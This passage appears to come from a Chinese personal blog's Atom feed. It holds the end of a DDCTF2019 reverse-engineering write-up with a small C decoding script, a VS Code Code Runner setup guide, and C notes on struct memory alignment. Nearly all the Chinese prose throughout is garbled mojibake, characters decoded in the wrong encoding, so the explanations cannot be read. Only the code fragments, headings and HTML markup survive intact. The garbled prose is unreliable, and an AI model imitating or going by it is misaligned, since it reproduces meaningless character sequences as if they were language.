title="ODåŠ¨æ€åˆ†æ"></a>ODåŠ¨æ€åˆ†æ</h3><p><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739860730789.jpg" srcset="/img/loading.gif" alt="-w555"><br>å®šä½åœ¨è¿™ä¸ªå­—ç¬¦ä¸²ä¹‹å‰åº”è¯¥å°±å¯ä»¥çœ‹åˆ°æˆ‘ä»¬è¾“å…¥åè¢«å¤„ç†åçš„å­—ç¬¦ä¸²ã€‚<br><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739861642584.jpg" srcset="/img/loading.gif" alt="-w1006"><br>åœ¨å‰é¢ä¸€ä¸ªå‡½æ•°è¿›è¡Œä¸‹æ–­ç‚¹ï¼Œä¹Ÿå¯ä»¥æ¸…æ¥šçœ‹åˆ°ä»–å°±æ˜¯æˆ‘ä»¬åˆšåˆšè¯´çš„åŠ å¯†å‡½æ•°<img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739862054229.jpg" srcset="/img/loading.gif" alt="-w334"><br>è¿™å°±æ˜¯ä¸€ä¸ªåœ°å€ã€‚ç„¶åæˆ‘ä»¬è¾“å…¥123æµ‹è¯•<br><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739862667897.jpg" srcset="/img/loading.gif" alt="-w361"><br>å·²ç»ç©¿è¿›eaxã€‚<img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739863094523.jpg" srcset="/img/loading.gif" alt="-w1199"><br>ç›´æ¥F8ä¸è¿›å…¥å‡½æ•°å†…éƒ¨ï¼Œå› ä¸ºæˆ‘ä»¬çš„ç›®çš„å°±çœ‹æ€ä¹ˆå¤„ç†äº†æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²ã€‚å‘ç°å˜æˆäº†<code>mlk</code>ã€‚<br>æŸ¥çœ‹ä¸‹å¯¹åº”çš„ASCIL:<img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739864384097.jpg" srcset="/img/loading.gif" alt="-w544"><br><strong>å¯ä»¥æ˜æ˜¾å‘ç°å¤„ç†å‰çš„å­—ç¬¦ä¸å¤„ç†åçš„å­—ç¬¦ç›¸åŠ éƒ½ç­‰äº158</strong>ã€‚</p><h3 id="è„šæœ¬è§£å¯†"><a href="#è„šæœ¬è§£å¯†" class="headerlink" title="è„šæœ¬è§£å¯†"></a>è„šæœ¬è§£å¯†</h3><div class="hljs"><pre><code>#include &lt;iostream&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main() {    char arr[]=&quot;DDCTF{reverseME}&quot;;    for (int i = 0; i &lt; strlen(arr); i++)    {        arr[i]=158-arr[i];    }    printf(&quot;%s&quot;,arr);    }</code></pre></div><p><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739865575323.jpg" srcset="/img/loading.gif" alt="-w250"><br><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739865898152.jpg" srcset="/img/loading.gif" alt="-w437"><br><strong>%æ˜¯VCç¼–è¯‘çš„å­—ç¬¦ä¸²ç»“æŸæ ‡å¿—ä¸ç”¨ä»£å…¥ã€‚</strong></p><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>åœ¨æŸåœ¨é¢˜ç›®ä¸­ï¼Œé™æ€åˆ†æåŠ å¯†å‡½æ•°æœ‰äº›å›°éš¾çš„æ—¶å€™ï¼Œå¾€å¾€æ²¡æœ‰åŠ¨æ€åˆ†ææ¥çš„å¿«ï¼Œæ„Ÿè§‰åŠ¨é™ç»“åˆåˆ†ææ˜¯å¾ˆå¥½çš„ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>Re</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vscodeçš„ç®€å•è°ƒæ•™</title>
    <link href="/2019/11/15/Vs%20code%E7%9A%84%E7%AE%80%E5%8D%95%E8%B0%83%E6%95%99/"/>
    <url>/2019/11/15/Vs%20code%E7%9A%84%E7%AE%80%E5%8D%95%E8%B0%83%E6%95%99/</url>
    
    <content type="html"><![CDATA[<h1 id="Vscodeçš„ç®€å•è°ƒæ•™"><a href="#Vscodeçš„ç®€å•è°ƒæ•™" class="headerlink" title="Vscodeçš„ç®€å•è°ƒæ•™"></a>Vscodeçš„ç®€å•è°ƒæ•™</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>VScodeæ˜¯æ¯”è¾ƒé€‚åˆè‡ªå·±ä½¿ç”¨çš„ï¼Œå› ä¸ºéå¸¸çš„ç®€æ´ä¸”ä¸è‡ƒè‚¿ï¼Œæ‹“å±•æ€§è¿˜å¥½ã€‚å¹¶ä¸”è‡ªå·±å¸¸å†™ä»£ç æ˜¯å°±æ˜¯ä¸ºäº†è¾“å…¥è¾“å‡ºå®ç°æŸäº›åŠŸèƒ½ï¼ŒåŸºæœ¬ç”¨ä¸åˆ°è°ƒè¯•åŠŸèƒ½ã€‚ä½†ç¢äºéš¾ä»¥é…ç½®å„ç§ç¯å¢ƒï¼Œä¸€ç›´æ²¡æœ‰ç”¨ä¸Šï¼Œå¤±è´¥äº†å¾ˆå¤šæ¬¡ã€‚ç°åœ¨åˆå­¦ç€æ•´äº†ä¸€ä¸‹ï¼Œç°åœ¨å·²ç»åƒä¸Šäº†vscodeçš„é¦™ã€‚å†™ä¸ªåšå®¢ï¼Œè®°å½•ä¸€ä¸‹ï¼Œä¹Ÿå¯ä»¥åˆ†æä¸‹ç»éªŒã€‚</p><h2 id="æ­£å¸¸è®¾ç½®"><a href="#æ­£å¸¸è®¾ç½®" class="headerlink" title="æ­£å¸¸è®¾ç½®"></a>æ­£å¸¸è®¾ç½®</h2><p><img src="/2019/11/15/Vs codeçš„ç®€å•è°ƒæ•™/images/15737872236921.jpg" srcset="/img/loading.gif" alt="-w143"></p><p>åœ¨è¿™é‡Œç‚¹å‡»å®Œè®¾ç½®ä»¥åï¼Œä¼šå‡ºç°ï¼š<br><img src="/2019/11/15/Vs codeçš„ç®€å•è°ƒæ•™/images/15737872693861.jpg" srcset="/img/loading.gif" alt="-w791"><br>åœ¨è¿™é‡Œå¯ä»¥è®¾ç½®vscodeçš„å„ç§åœ°æ–¹ï¼Œå°±å¦‚å›¾ä¸­ä¸€æ ·ï¼Œéœ€è¦è‡ªå·±æ¢ç´¢ä¸€ä¸‹ï¼Œç„¶åè®¾ç½®æˆè‡ªå·±æƒ³è¦çš„ç»“æœã€‚</p><h2 id="é…ç½®ç¼–è¯‘ç¯å¢ƒ"><a href="#é…ç½®ç¼–è¯‘ç¯å¢ƒ" class="headerlink" title="é…ç½®ç¼–è¯‘ç¯å¢ƒ"></a>é…ç½®ç¼–è¯‘ç¯å¢ƒ</h2><p>è¿™é‡Œæˆ‘åªç”¨åˆ°c/c++å’ŒPythonå°±åªè®°å½•è¿™ä¸ªäº†ã€‚<br><img src="/2019/11/15/Vs codeçš„ç®€å•è°ƒæ•™/images/15737878495576.jpg" srcset="/img/loading.gif" alt="-w449"><br>è¾“å…¥C/C++<br><img src="/2019/11/15/Vs codeçš„ç®€å•è°ƒæ•™/images/15737879247492.jpg" srcset="/img/loading.gif" alt="-w676"><br>åœ¨è¿™é‡Œè¿›è¡Œç‚¹ä¸ªinstallã€‚<br>PYthonä¹Ÿæ˜¯åŒæ ·çš„æ“ä½œã€‚</p><h2 id="è®©ä»£ç è·‘èµ·æ¥"><a href="#è®©ä»£ç è·‘èµ·æ¥" class="headerlink" title="è®©ä»£ç è·‘èµ·æ¥"></a>è®©ä»£ç è·‘èµ·æ¥</h2><p>åœ¨åº”ç”¨å•†åº—é‡Œæœç´¢<strong>Code Runner</strong>ã€‚<br><img src="/2019/11/15/Vs codeçš„ç®€å•è°ƒæ•™/images/15737881342794.jpg" srcset="/img/loading.gif" alt="-w653"><br>è¿™ä¸ªæ˜¯ä¸ªç¥å™¨ï¼Œæœ‰äº†å®ƒå°±å¯ä»¥åœ¨vscodeç›´æ¥è¿è¡Œå„ç§ä»£ç ã€‚<br>å®‰è£…å¥½åæŠŠvscodeå…³é—­ï¼Œç„¶åé‡æ–°æ‰“å¼€ã€‚</p><h3 id="æ–°å»ºä¸ªC-C-æ–‡ä»¶ï¼š"><a href="#æ–°å»ºä¸ªC-C-æ–‡ä»¶ï¼š" class="headerlink" title="æ–°å»ºä¸ªC/C++æ–‡ä»¶ï¼š"></a>æ–°å»ºä¸ªC/C++æ–‡ä»¶ï¼š</h3><p><img src="/2019/11/15/Vs codeçš„ç®€å•è°ƒæ•™/images/15737885382202.jpg" srcset="/img/loading.gif" alt="-w677"><br>ç„¶åå³é”®<br><img src="/2019/11/15/Vs codeçš„ç®€å•è°ƒæ•™/images/15737886009237.jpg" srcset="/img/loading.gif" alt="-w287"><br>æ˜¯å¯ä»¥è¿è¡Œä»£ç çš„ã€‚<br>åœ¨å³ä¸Šè§’ï¼š<br><img src="/2019/11/15/Vs codeçš„ç®€å•è°ƒæ•™/images/15737886490345.jpg" srcset="/img/loading.gif" alt="-w305"><br>è¿™ä¸ªå°ä¸‰è§’ä¹Ÿå¯ä»¥è¿è¡Œä»£ç ã€‚çœ‹ä¸‹æ•ˆæœï¼š<br><img src="/2019/11/15/Vs codeçš„ç®€å•è°ƒæ•™/images/15737886695093.jpg" srcset="/img/loading.gif" alt="-w1007"></p><h3 id="æ›´æ”¹ä¸ºç»ˆç«¯è¾“å‡º"><a href="#æ›´æ”¹ä¸ºç»ˆç«¯è¾“å‡º" class="headerlink" title="æ›´æ”¹ä¸ºç»ˆç«¯è¾“å‡º"></a>æ›´æ”¹ä¸ºç»ˆç«¯è¾“å‡º</h3><p>æˆ‘ä»¬æ”¹ä¸€ä¸‹ä»£ç ï¼š<br>    #include <iostream><br><br>    int main() {<br>        int a;<br>        scanf(â€œ%dâ€,&amp;a);<br>        printf(â€œhello world!â€);<br><br>    }</iostream></p><p>åœ¨è¿™æ ·ç›´æ¥è¿è¡Œåå‘ç°ï¼š<img src="/2019/11/15/Vs codeçš„ç®€å•è°ƒæ•™/images/15737890616864.jpg" srcset="/img/loading.gif" alt="-w1070"><br>å¡åœ¨è¿è¡Œè¿‡ç¨‹ä¸”æˆ‘ä»¬æ— æ³•è¾“å…¥ï¼š<br><img src="/2019/11/15/Vs codeçš„ç®€å•è°ƒæ•™/images/15737891086923.jpg" srcset="/img/loading.gif" alt="-w290"><br>è¿™ä¸ªè§£å†³åŠæ³•å°±æ˜¯<strong>æ›´æ”¹ä¸ºç»ˆç«¯è¾“å‡ºå°±å¯ä»¥äº†</strong>ã€‚<br><img src="/2019/11/15/Vs codeçš„ç®€å•è°ƒæ•™/images/15737891942172.jpg" srcset="/img/loading.gif" alt="-w479"><br>ç‚¹å‡»é…ç½®æ‰©å±•ä¿¡æ¯ã€‚ä¸‹æ»‘æ‰¾åˆ°ï¼š<br><img src="/2019/11/15/Vs codeçš„ç®€å•è°ƒæ•™/images/15737893476953.jpg" srcset="/img/loading.gif" alt="-w559"><br>ç„¶åæ‰“ä¸ªå‹¾å°±å¯ä»¥äº†ã€‚<br>è¿è¡Œï¼š<br><img src="/2019/11/15/Vs codeçš„ç®€å•è°ƒæ•™/images/15737894451238.jpg" srcset="/img/loading.gif" alt="-w677"><br>å‘ç°æˆåŠŸäº†ï¼Œç„¶åçœ‹ä¸‹å…¶åŸç†å°±æ˜¯å¸®ä½ å¯¹ç»ˆç«¯è¿›è¡Œäº†<br><code>cd &quot;/Volumes/data/c:c++/&quot; &amp;&amp; g++ test.cpp -o test &amp;&amp; &quot;/Volumes/data/c:c++/&quot;test</code>è¿™ä¸ªå‘½ä»¤çš„æ‰§è¡Œï¼Œå‘ç°å…¶æ˜¯ç”¨gccè¿›è¡Œäº†ç¼–è¯‘ï¼Œmacæ˜¯è‡ªå¸¦clangçš„ï¼Œclangçš„ä¼˜ç‚¹æŒºå¤šçš„ï¼Œ<strong>ä¸”æ”¯æŒè¯­æ³•é”™è¯¯çš„æ£€æµ‹ï¼Œ</strong>ç„¶åå°±æƒ³ç€å»æ”¹ä¸‹è®©å…¶ç”¨clang++æ¥ç¼–è¯‘ã€‚</p><h3 id="è‡ªå®šä¹‰è¿è¡Œé€»è¾‘"><a href="#è‡ªå®šä¹‰è¿è¡Œé€»è¾‘" class="headerlink" title="è‡ªå®šä¹‰è¿è¡Œé€»è¾‘"></a>è‡ªå®šä¹‰è¿è¡Œé€»è¾‘</h3><p><img src="/2019/11/15/Vs codeçš„ç®€å•è°ƒæ•™/images/15737891942172.jpg" srcset="/img/loading.gif" alt="-w479"><br>è¿˜æ˜¯è¿›å…¥è¿™ä¸ªé…ç½®é‡Œé¢ï¼š<br><img src="/2019/11/15/Vs codeçš„ç®€å•è°ƒæ•™/images/15737897368419.jpg" srcset="/img/loading.gif" alt="-w411"><br>åœ¨settings.jsonä¸­ç¼–è¾‘:</p><div class="hljs"><pre><code>&quot;code-runner.executorMap&quot; : {       &quot;java&quot;: &quot;cd $dir &amp;&amp; javac $fileName &amp;&amp; java $fileNameWithoutExt&quot;,       &quot;c&quot;: &quot;cd $dir &amp;&amp; clang++ $fileName -o $fileNameWithoutExt &amp;&amp; $dir$fileNameWithoutExt&quot;,       &quot;cpp&quot;: &quot;cd $dir &amp;&amp; clang++ $fileName -o $fileNameWithoutExt &amp;&amp; $dir$fileNameWithoutExt&quot;,       &quot;objective-c&quot;: &quot;cd $dir &amp;&amp; clang++ -framework Cocoa $fileName -o $fileNameWithoutExt &amp;&amp; $dir$fileNameWithoutExt&quot;,       &quot;php&quot;: &quot;php&quot;,       &quot;python&quot;: &quot;python -u&quot;,       &quot;ruby&quot;: &quot;ruby&quot;,   }</code></pre></div><h4 id="æˆå“ï¼š"><a href="#æˆå“ï¼š" class="headerlink" title="æˆå“ï¼š"></a>æˆå“ï¼š</h4><p><img src="/2019/11/15/Vs codeçš„ç®€å•è°ƒæ•™/images/15737900505196.jpg" srcset="/img/loading.gif" alt="-w1110"><br>ç›´æ¥ç²˜è´´è¿™æ®µä»£ç æ”¾å…¥è¿™é‡Œé¢ä¿å­˜å°±å¯ä»¥äº†ã€‚</p><h4 id="æ•ˆæœï¼š"><a href="#æ•ˆæœï¼š" class="headerlink" title="æ•ˆæœï¼š"></a>æ•ˆæœï¼š</h4><p><img src="/2019/11/15/Vs codeçš„ç®€å•è°ƒæ•™/images/15737901558381.jpg" srcset="/img/loading.gif" alt="-w860"><br>å®ç°æˆ‘ä»¬çš„ç›®çš„äº†ã€‚</p><h3 id="æµ‹è¯•ä¸€ä¸‹Python"><a href="#æµ‹è¯•ä¸€ä¸‹Python" class="headerlink" title="æµ‹è¯•ä¸€ä¸‹Python"></a>æµ‹è¯•ä¸€ä¸‹Python</h3><p>è¿™æ˜¯ç›´æ¥æ–°å»ºçš„ï¼š<br><img src="/2019/11/15/Vs codeçš„ç®€å•è°ƒæ•™/images/15737904131858.jpg" srcset="/img/loading.gif" alt="-w430"><br><img src="/2019/11/15/Vs codeçš„ç®€å•è°ƒæ•™/images/15737904322136.jpg" srcset="/img/loading.gif" alt="-w465"><br>è¿™æ ·å°±å¯ä»¥ä¸€ä¸ªvscodeè¿è¡Œå„ç§ä»£ç ï¼Œå¯¹äºä¸æ˜¯ä¸“é—¨åšå¼€å‘ï¼Œåªæ˜¯å†™è„šæœ¬çš„ï¼Œå°±æ˜¯ä¸ªç¦éŸ³ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>vscode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäº”ï¼‰</title>
    <link href="/2019/11/12/C%E8%AF%AD%E8%A8%80%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%94%EF%BC%89/"/>
    <url>/2019/11/12/C%E8%AF%AD%E8%A8%80%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%94%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäº”ï¼‰"><a href="#Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäº”ï¼‰" class="headerlink" title="Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäº”ï¼‰"></a>Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäº”ï¼‰</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä¸»è¦æ˜¯è®°å½•ä¸€ä¸‹ï¼Œåœ¨å­¦ä¹ è¿‡ç¨‹ä¸­è®¤ä¸ºå®¹æ˜“å¿˜è®°ä¸”é‡è¦çš„ä¸œè¥¿ï¼Œæ–¹ä¾¿ä»¥åå¿˜äº†å†æ¥å­¦ä¹ ä¸€ä¸‹ã€‚<strong>é›†ä¸­äºç»“æ„ä½“éƒ¨åˆ†ä»¥åŠç»“æ„ä½“å¯¹é½çš„çŸ¥è¯†ã€‚</strong></p><h2 id="ç»“æ„ä½“çš„ä½¿ç”¨ç»ƒä¹ "><a href="#ç»“æ„ä½“çš„ä½¿ç”¨ç»ƒä¹ " class="headerlink" title="ç»“æ„ä½“çš„ä½¿ç”¨ç»ƒä¹ "></a>ç»“æ„ä½“çš„ä½¿ç”¨ç»ƒä¹ </h2><p>1ã€å®šä¹‰ä¸€ä¸ªç»“æ„ä½“Gamerç”¨æ¥å­˜å‚¨ä¸€ä¸ªæ¸¸æˆä¸­çš„è§’è‰²çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬è¡€å€¼ã€ç­‰çº§ã€åæ ‡ç­‰ä¿¡æ¯    ã€‚<br>è¦æ±‚ï¼š<br>    (1) å…·ä½“åŒ…å«å“ªäº›ä¿¡æ¯è‡ªç”±è®¾è®¡<br>    (2) ä½†è¿™äº›åŒ…å«çš„ç±»å‹ä¸­ï¼Œå¿…é¡»è¦æœ‰ä¸€ä¸ªæˆå‘˜æ˜¯ç»“æ„ä½“ç±»å‹ã€‚<br>    2ã€å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œç”¨æ¥ç»™è¿™ä¸ªç»“æ„ä½“å˜é‡èµ‹å€¼.<br>3ã€å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œç”¨æ¥æ˜¾ç¤ºè¿™ä¸ªç»“æ„ä½“å˜é‡çš„æ‰€æœ‰æˆå‘˜ä¿¡æ¯.<br>    #include <iostream><br>    #include &lt;stdio.h&gt;<br>    #include &lt;string.h&gt;<br>    struct point<br>    {<br>        int x;<br>        int y;<br>        int z;<br>    };<br>    struct Gamer<br>    {<br>        char name[20];<br>        int level;<br>        float HP;<br>        point a;<br>    }No1;<br>    void Function()<br>    {<br>        char a[]=â€xiaozhiâ€;<br>        for (int i = 0; i &lt;strlen(a) ; ++i) {<br>            No1.name[i]=a[i];<br>        }<br>        No1.level = 99;<br>        No1.HP = 99.9;<br>        No1.a.x=6;<br>        No1.a.y=5;<br>        No1.a.z=9;<br>    }<br>    void Display()<br>    {<br>        printf(â€œname:%s level:%d HP:%f point:%d %d %d â€œ,No1.name,No1.level,No1.HP,No1.a.x,No1.a.y,No1.a.z);<br>    }<br>    int main() {<br>        Function();<br>        Display();<br>        return 0;<br>    }</iostream></p><h2 id="sizeofçš„ä½¿ç”¨"><a href="#sizeofçš„ä½¿ç”¨" class="headerlink" title="sizeofçš„ä½¿ç”¨"></a>sizeofçš„ä½¿ç”¨</h2><h3 id="åŸºæœ¬ç±»å‹çš„sizeof"><a href="#åŸºæœ¬ç±»å‹çš„sizeof" class="headerlink" title="åŸºæœ¬ç±»å‹çš„sizeof"></a>åŸºæœ¬ç±»å‹çš„sizeof</h3><p>å¯ä»¥ä½¿ç”¨ç±»å‹ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å˜é‡<br>ä¾‹å­ï¼š</p><p>printf(â€œ%d\nâ€,sizeof(char));<br>printf(â€œ%d\nâ€,sizeof(int));<br>printf(â€œ%d\nâ€,sizeof(float));<br>printf(â€œ%d\nâ€,sizeof(double));</p><p>int x = 10;            //å˜é‡<br>printf(â€œ%d\nâ€,sizeof(x));        </p><h3 id="æ•°ç»„ç±»å‹çš„sizeof"><a href="#æ•°ç»„ç±»å‹çš„sizeof" class="headerlink" title="æ•°ç»„ç±»å‹çš„sizeof"></a>æ•°ç»„ç±»å‹çš„sizeof</h3><p>ä¾‹å­ï¼š<br>    char arr1[10] = {0};<br>    short arr2[10] = {0};<br>    int arr3[10] = {0};                </p><div class="hljs"><pre><code>printf(&quot;%d\n&quot;,sizeof(arr1));                //10printf(&quot;%d\n&quot;,sizeof(arr2));            //    20printf(&quot;%d\n&quot;,sizeof(arr3));            //    40printf(&quot;%d\n&quot;,sizeof(arr1[10]));            //    1printf(&quot;%d\n&quot;,sizeof(arr2[10]));            //    2printf(&quot;%d\n&quot;,sizeof(arr3[10]));                //4</code></pre></div><p>æ³¨æ„å…¶ä¸­çš„ä¸åŒã€‚</p><h2 id="ç»“æ„ä½“ï¼ˆå†…å­˜ï¼‰å¯¹é½"><a href="#ç»“æ„ä½“ï¼ˆå†…å­˜ï¼‰å¯¹é½" class="headerlink" title="ç»“æ„ä½“ï¼ˆå†…å­˜ï¼‰å¯¹é½"></a>ç»“æ„ä½“ï¼ˆå†…å­˜ï¼‰å¯¹é½</h2><h3 id="ä¸ºä»€ä¹ˆè¦æœ‰å†…å­˜å¯¹é½ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆè¦æœ‰å†…å­˜å¯¹é½ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆè¦æœ‰å†…å­˜å¯¹é½ï¼Ÿ"></a>ä¸ºä»€ä¹ˆè¦æœ‰å†…å­˜å¯¹é½ï¼Ÿ</h3><p>æœ¬è´¨ï¼šæ˜¯è¦æ•ˆç‡è¿˜æ˜¯ç©ºé—´ï¼ŒäºŒé€‰ä¸€çš„ç»“æœ.ç»Ÿç§°æ˜¯æ€§èƒ½ï¼Œè¿˜æœ‰å°ç§»æ¤ç­‰å› ç´ ï¼Œç¼–è¯‘å™¨å¯¹æ•°æ®ç»“æ„è¿›è¡Œäº†å†…å­˜å¯¹é½ã€‚</p><h3 id="pragma-packçš„åŸºæœ¬ç”¨æ³•"><a href="#pragma-packçš„åŸºæœ¬ç”¨æ³•" class="headerlink" title="pragma packçš„åŸºæœ¬ç”¨æ³•"></a>pragma packçš„åŸºæœ¬ç”¨æ³•</h3><p>åœ¨vc6.0++ä¸­é»˜è®¤å€¼æ˜¯8å­—èŠ‚å¯¹é½ã€‚</p><div class="hljs"><pre><code>#pragma pack( n )ç»“æ„ä½“ã€‚#pragma pack(  )</code></pre></div><p>è¯¥æ“ä½œä¼šæ”¹å˜ä¸€ä¸ªç»“æ„ä½“çš„å­—èŠ‚å¯¹é½æ•°ï¼Œè¿™æ˜¯é’ˆå¯¹ç¼–è¯‘å™¨çš„ã€‚<br>å¯¹é½å‚æ•°ï¼šnä¸ºå­—èŠ‚å¯¹é½æ•°ï¼Œå…¶å–å€¼ä¸º1ã€2ã€4ã€8ï¼Œé»˜è®¤æ˜¯8ã€‚<br>å¦‚æœè¿™ä¸ªå€¼æ¯”ç»“æ„ä½“æˆå‘˜çš„sizeofå€¼å°ï¼Œé‚£ä¹ˆè¯¥æˆå‘˜çš„åç§»é‡åº”è¯¥ä»¥æ­¤å€¼ä¸ºå‡†ï¼Œ<strong>å³æ˜¯è¯´ï¼Œç»“æ„ä½“æˆå‘˜çš„åç§»é‡åº”è¯¥å–äºŒè€…çš„æœ€å°å€¼.</strong></p><div class="hljs"><pre><code>#pragma pack(n)            struct Test            {                 int a ;                 __int64 b ;                 char c ;            };            #pragma pack()            </code></pre></div><p>ä»¥ä¸‹æ˜¯å„ç§æƒ…å†µçš„å†…å­˜å¯¹é½åˆ†æ:<br>1:1å­—èŠ‚å¯¹é½<br><img src="/2019/11/12/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäº”ï¼‰/images/15735626712023.jpg" srcset="/img/loading.gif" alt="-w155"><br>2:2å­—èŠ‚å¯¹é½æ—¶ï¼š<br><img src="/2019/11/12/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäº”ï¼‰/images/15735626990588.jpg" srcset="/img/loading.gif" alt="-w266"><br>3ï¼š4ä¸ªå­—èŠ‚å¯¹é½<br><img src="/2019/11/12/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäº”ï¼‰/images/15735627321430.jpg" srcset="/img/loading.gif" alt="-w381"><br>4ã€8ä¸ªå­—èŠ‚å¯¹é½</p><p><img src="/2019/11/12/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäº”ï¼‰/images/15735627463362.jpg" srcset="/img/loading.gif" alt="-w583"></p><h3 id="å¯¹é½åŸåˆ™ï¼š"><a href="#å¯¹é½åŸåˆ™ï¼š" class="headerlink" title="å¯¹é½åŸåˆ™ï¼š"></a>å¯¹é½åŸåˆ™ï¼š</h3><p>åŸåˆ™ä¸€ï¼šæ•°æ®æˆå‘˜å¯¹é½è§„åˆ™ï¼šç»“æ„çš„æ•°æ®æˆå‘˜ï¼Œç¬¬ä¸€ä¸ªæ•°æ®æˆå‘˜æ”¾åœ¨offsetä¸º0çš„åœ°æ–¹ï¼Œä»¥åæ¯ä¸ªæ•°æ®æˆå‘˜å­˜å‚¨çš„èµ·å§‹ä½ç½®è¦ä»è¯¥æˆå‘˜å¤§å°çš„æ•´æ•°å€å¼€å§‹(æ¯”å¦‚intåœ¨32ä½æœºä¸ºï¼”å­—èŠ‚ï¼Œåˆ™è¦ä»4çš„æ•´æ•°å€åœ°å€å¼€å§‹å­˜å‚¨).                                    </p><p>åŸåˆ™äºŒï¼šç»“æ„ä½“çš„æ€»å¤§å°ï¼Œä¹Ÿå°±æ˜¯sizeofçš„ç»“æœï¼Œå¿…é¡»æ˜¯å…¶å†…éƒ¨æœ€å¤§æˆå‘˜çš„æ•´æ•°å€ï¼Œä¸è¶³çš„è¦è¡¥é½ã€‚<br>åŸåˆ™ä¸‰ï¼šå¦‚æœä¸€ä¸ªç»“æ„é‡Œæœ‰æŸäº›ç»“æ„ä½“æˆå‘˜ï¼Œåˆ™ç»“æ„ä½“æˆå‘˜è¦ä»å…¶å†…éƒ¨æœ€å¤§å…ƒç´ å¤§å°çš„æ•´æ•°å€åœ°å€å¼€å§‹å­˜å‚¨ã€‚                                    <strong>(struct aé‡Œå­˜æœ‰struct bï¼Œbé‡Œæœ‰charï¼Œintï¼Œdoubleç­‰å…ƒç´ ï¼Œé‚£båº”è¯¥ä»8çš„æ•´æ•°å€å¼€å§‹å­˜å‚¨.)</strong>                                    </p><p>åŸåˆ™å››ï¼šå¯¹é½å‚æ•°å¦‚æœæ¯”ç»“æ„ä½“æˆå‘˜çš„sizeofå€¼å°ï¼Œè¯¥æˆå‘˜çš„åç§»é‡åº”è¯¥ä»¥æ­¤å€¼ä¸ºå‡†.<br>    ä¹Ÿå°±æ˜¯è¯´ï¼Œç»“æ„ä½“æˆå‘˜çš„åç§»é‡åº”è¯¥å–äºŒè€…çš„æœ€å°å€¼.                                </p><p><strong>ç”±æµ…å…¥æ·±ï¼Œåˆ†æå†…å­˜å¯¹é½åŸåˆ™åå†…å­˜åˆ°åº•æ˜¯æ€ä¹ˆåˆ†é…çš„</strong></p><h4 id="æ¡ˆä¾‹åˆ†æä¸€ï¼š"><a href="#æ¡ˆä¾‹åˆ†æä¸€ï¼š" class="headerlink" title="æ¡ˆä¾‹åˆ†æä¸€ï¼š"></a>æ¡ˆä¾‹åˆ†æä¸€ï¼š</h4><div class="hljs"><pre><code>struct Test                {                    char  a;                    int b ;                };                </code></pre></div><p><img src="/2019/11/12/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäº”ï¼‰/images/15735632219948.jpg" srcset="/img/loading.gif" alt="-w671"><br><strong>sizeof(Test) =1+3ï¼ˆè¡¥é½çš„ï¼‰+4=8(å…¶ä¸­æœ€å¤§çš„4çš„æ•´å€æ•°)</strong></p><h4 id="æ¡ˆä¾‹äºŒåˆ†æï¼š"><a href="#æ¡ˆä¾‹äºŒåˆ†æï¼š" class="headerlink" title="æ¡ˆä¾‹äºŒåˆ†æï¼š"></a>æ¡ˆä¾‹äºŒåˆ†æï¼š</h4><div class="hljs"><pre><code>struct Test                    {                        int a ;                        __int64 b ;                        char c ;                    };                    </code></pre></div><p><img src="/2019/11/12/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäº”ï¼‰/images/15735634186981.jpg" srcset="/img/loading.gif" alt="-w621"><br><strong>sizeof(Test) =4+4ï¼ˆè¡¥é½çš„ï¼‰+8+1+7ï¼ˆè¡¥é½çš„ï¼‰=24(å…¶ä¸­æœ€å¤§çš„8çš„æ•´å€æ•°)</strong></p><h4 id="æ¡ˆä¾‹ä¸‰åˆ†æï¼š"><a href="#æ¡ˆä¾‹ä¸‰åˆ†æï¼š" class="headerlink" title="æ¡ˆä¾‹ä¸‰åˆ†æï¼š"></a>æ¡ˆä¾‹ä¸‰åˆ†æï¼š</h4><div class="hljs"><pre><code>struct Test                    {                        int a ;                        __int64 b ;                        char c ;                        char d ;                    };                    </code></pre></div><p><img src="/2019/11/12/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ 